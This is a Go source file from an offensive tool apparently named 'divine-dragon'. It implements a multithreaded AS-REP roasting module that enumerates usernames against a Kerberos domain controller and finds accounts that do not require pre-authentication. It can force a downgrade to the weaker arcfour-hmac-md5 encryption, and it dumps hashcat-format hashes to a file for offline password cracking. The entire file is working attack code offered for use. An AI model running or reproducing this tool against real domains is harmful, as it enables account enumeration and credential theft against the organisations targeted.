package remote_exploit

import (
	"bufio"
	"context"
	"divine-dragon/transport"
	"divine-dragon/util"
	"fmt"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ropnop/gokrb5/v8/messages"
)

type ASREPRoastingModule struct {
	domain       string
	dc           string
	verbose      bool
	safemode     bool
	downgrade    bool
	hashFile     *os.File
	usernamelist string

	kSession transport.KerberosSession
	kOptions transport.KerberosSessionOptions

	ctx       context.Context
	cancel    context.CancelFunc
	threads   int
	delay     int
	counter   int32
	successes int32

	logger util.Logger
}

func NewASREPRoastingModule(domainOpt string, dcOpt string, verboseOpt bool, safemodeOpt bool,
	downgradeOpt bool, hashfilenameOpt string, usernamelistOpt string,
	logFileName string, threadsOpt int, delayOpt int) *ASREPRoastingModule {
	ap := ASREPRoastingModule{domain: domainOpt,
		dc:           dcOpt,
		verbose:      verboseOpt,
		safemode:     safemodeOpt,
		downgrade:    downgradeOpt,
		usernamelist: usernamelistOpt}
	ap.ctx, ap.cancel = context.WithCancel(context.Background())
	ap.logger = util.ASREPRoastingLogger(verboseOpt, logFileName)
	ap.delay = delayOpt
	if delayOpt != 0 {
		ap.threads = 1
		ap.logger.Log.Infof("Delay set. Using single thread and delaying %dms between attempts\n", ap.delay)
	} else {
		ap.threads = threadsOpt
	}
	if hashfilenameOpt != "" {
		hashFile, err := os.OpenFile(hashfilenameOpt, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		ap.hashFile = hashFile
		if err != nil {
			ap.logger.Log.Errorf("Can't create a file for saving hashes - %v", err)
		}
		ap.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if downgradeOpt {
			ap.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}
	ap.setupSession()
	return &ap
}

func (ap *ASREPRoastingModule) setupSession() {
	ap.kOptions = transport.KerberosSessionOptions{
		Domain:           ap.domain,
		DomainController: ap.dc,
		Verbose:          ap.verbose,
		SafeMode:         ap.safemode,
		Downgrade:        ap.downgrade,
	}
	k, err := transport.NewKerberosSession(ap.kOptions)
	if err != nil {
		ap.logger.Log.Error(err)
	}
	ap.kSession = k

	ap.logger.Log.Info("Using KDC(s):")
	for _, v := range ap.kSession.Kdcs {
		ap.logger.Log.Infof("\t%s\n", v)
	}
}

func (ap *ASREPRoastingModule) Run() {
	usersChan := make(chan string, ap.threads)
	defer ap.cancel()

	var wg sync.WaitGroup
	wg.Add(ap.threads)

	var scanner *bufio.Scanner
	if ap.usernamelist != "-" {
		file, err := os.Open(ap.usernamelist)
		if err != nil {
			// logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < ap.threads; i++ {
		go ap.makeASREPRoastingWorker(ap.ctx, usersChan, &wg)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ap.ctx.Done():
			break Scan
		default:
			usernameline := scanner.Text()
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				ap.logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				continue
			}
			time.Sleep(time.Duration(ap.delay) * time.Millisecond)
			usersChan <- username
		}
	}
	close(usersChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&ap.counter)
	finalSuccess := atomic.LoadInt32(&ap.successes)
	ap.logger.Log.Infof("Done! Tested %d usernames (%d valid) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		ap.logger.Log.Error(err.Error())
	}
}

func (ap *ASREPRoastingModule) makeASREPRoastingWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			ap.doOneASREP(ctx, username)
		}
	}
}

func (ap *ASREPRoastingModule) doOneASREP(ctx context.Context, username string) {
	atomic.AddInt32(&ap.counter, 1)
	usernamefull := fmt.Sprintf("%v@%v", username, ap.domain)
	valid, rb, err := ap.kSession.TestUsername(username)
	if valid {
		atomic.AddInt32(&ap.successes, 1)
		if rb != nil {
			// If no error, we actually got an AS REP, meaning user does not have pre-auth required
			var ASRep messages.ASRep
			err = ASRep.Unmarshal(rb)
			if err != nil {
				// something went wrong, it's not a valid response
				ap.logger.Log.Errorf("[!] Invalid response: %v - %v", usernamefull, err)
			}
			ap.DumpASRepHash(ASRep)
		} else {
			if err != nil {
				ap.logger.Log.Infof("[-] VALID USERNAME WITH ERROR:\t %s\t (%s)", username, err)
			} else {
				ap.logger.Log.Infof("[-] VALID USERNAME BUT WITH REQUIRED PRE AUTH:\t %s", usernamefull)
			}
		}
	} else if err != nil {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := ap.kSession.HandleKerbError(err)
		if !ok {
			ap.logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
			ap.cancel()
		} else {
			ap.logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
		}
	} else {
		ap.logger.Log.Debug("[!] Unknown behavior - %v", usernamefull)
	}
}

func (ap *ASREPRoastingModule) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	// TODO:
	// Think about a way to save hash in temp file if filename was not specified.
	// Think about a way to run hashcat in a new process with proper command to crack the hashes
	// Maybe CLI will ask user to run hashcat...
	if err != nil {
		ap.logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	ap.logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if ap.hashFile != nil {
		_, err := ap.hashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			ap.logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
